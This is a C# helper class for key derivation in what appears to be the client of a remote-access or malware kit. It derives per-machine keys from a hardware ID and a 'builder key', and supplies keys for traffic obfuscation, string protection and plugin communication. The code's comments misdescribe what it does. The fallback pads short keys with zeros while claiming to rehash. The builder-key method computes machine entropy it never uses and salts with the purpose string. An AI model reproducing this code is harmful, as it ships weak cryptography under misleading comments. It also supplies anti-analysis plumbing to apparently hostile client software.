using System;
using System.Security.Cryptography;
using System.Text;

namespace Client.Helper
{
    /// <summary>
    /// Secure key derivation for client-side encryption
    /// Uses machine-specific entropy to derive unique keys
    /// </summary>
    public static class SecureKeyDerivation
    {
        // Base entropy sources (combined with HWID for uniqueness)
        private static readonly byte[] BaseSalt = new byte[] 
        { 
            0xA7, 0x3C, 0xE5, 0x91, 0x2B, 0xD8, 0x4F, 0x6A,
            0xC2, 0x1E, 0x89, 0x54, 0xB3, 0x7F, 0x0D, 0x96
        };

        /// <summary>
        /// Derives a cryptographically strong key from machine-specific data
        /// This ensures each client has a unique key even if captured
        /// </summary>
        public static byte[] DeriveKey(string purpose, int keySize = 32)
        {
            if (string.IsNullOrEmpty(purpose))
                throw new ArgumentException("Purpose cannot be null or empty", nameof(purpose));

            if (keySize < 16 || keySize > 64)
                throw new ArgumentException("Key size must be between 16 and 64 bytes", nameof(keySize));

            try
            {
                // Combine HWID + purpose + base salt for unique key per purpose
                string hwid = HwidGen.HWID();
                byte[] combined = Encoding.UTF8.GetBytes(hwid + purpose);
                
                // Use PBKDF2 with high iteration count
                using (var pbkdf2 = new Rfc2898DeriveBytes(combined, BaseSalt, 100000, HashAlgorithmName.SHA256))
                {
                    return pbkdf2.GetBytes(keySize);
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to derive secure key", ex);
                
                // Fallback: use SHA-256 hash (less secure but functional)
                using (var sha = SHA256.Create())
                {
                    byte[] fallback = Encoding.UTF8.GetBytes(HwidGen.HWID() + purpose);
                    byte[] hash = sha.ComputeHash(fallback);
                    
                    if (keySize <= hash.Length)
                        return hash;
                    
                    // If need more bytes, hash multiple times
                    byte[] extended = new byte[keySize];
                    Buffer.BlockCopy(hash, 0, extended, 0, hash.Length);
                    return extended;
                }
            }
        }

        /// <summary>
        /// Derives key from builder-provided key (Release mode)
        /// </summary>
        public static byte[] DeriveFromBuilderKey(string builderKey, string purpose)
        {
            if (string.IsNullOrEmpty(builderKey))
                throw new ArgumentException("Builder key cannot be null", nameof(builderKey));

            try
            {
                // Decode builder key
                byte[] keyBytes = Encoding.UTF8.GetBytes(builderKey);
                byte[] purposeBytes = Encoding.UTF8.GetBytes(purpose);
                
                // Combine with machine entropy for additional security
                byte[] hwidBytes = Encoding.UTF8.GetBytes(HwidGen.HWID());
                
                using (var pbkdf2 = new Rfc2898DeriveBytes(keyBytes, purposeBytes, 50000, HashAlgorithmName.SHA256))
                {
                    return pbkdf2.GetBytes(32);
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to derive key from builder", ex);
                return null;
            }
        }

        /// <summary>
        /// Gets obfuscation key for traffic encryption
        /// </summary>
        public static byte[] GetObfuscationKey()
        {
            return DeriveKey("TrafficObfuscation", 32);
        }

        /// <summary>
        /// Gets string protection key for internal encryption
        /// </summary>
        public static byte[] GetStringProtectionKey()
        {
            return DeriveKey("StringProtection", 32);
        }

        /// <summary>
        /// Gets plugin communication key
        /// </summary>
        public static byte[] GetPluginKey()
        {
            return DeriveKey("PluginComm", 32);
        }

        /// <summary>
        /// Securely wipes key from memory
        /// </summary>
        public static void WipeKey(byte[] key)
        {
            if (key == null) return;
            
            try
            {
                // Overwrite with random data
                using (var rng = RandomNumberGenerator.Create())
                {
                    rng.GetBytes(key);
                }
                
                // Zero out
                Array.Clear(key, 0, key.Length);
            }
            catch (Exception ex)
            {
                // Non-critical: Key cleanup failed but doesn't affect operation
                Logger.Error(ex);
            }
        }

        /// <summary>
        /// Validates that derived key is not empty or weak
        /// </summary>
        public static bool ValidateKey(byte[] key)
        {
            if (key == null || key.Length < 16)
                return false;

            // Check not all zeros
            bool hasNonZero = false;
            foreach (byte b in key)
            {
                if (b != 0)
                {
                    hasNonZero = true;
                    break;
                }
            }

            return hasNonZero;
        }
    }
}
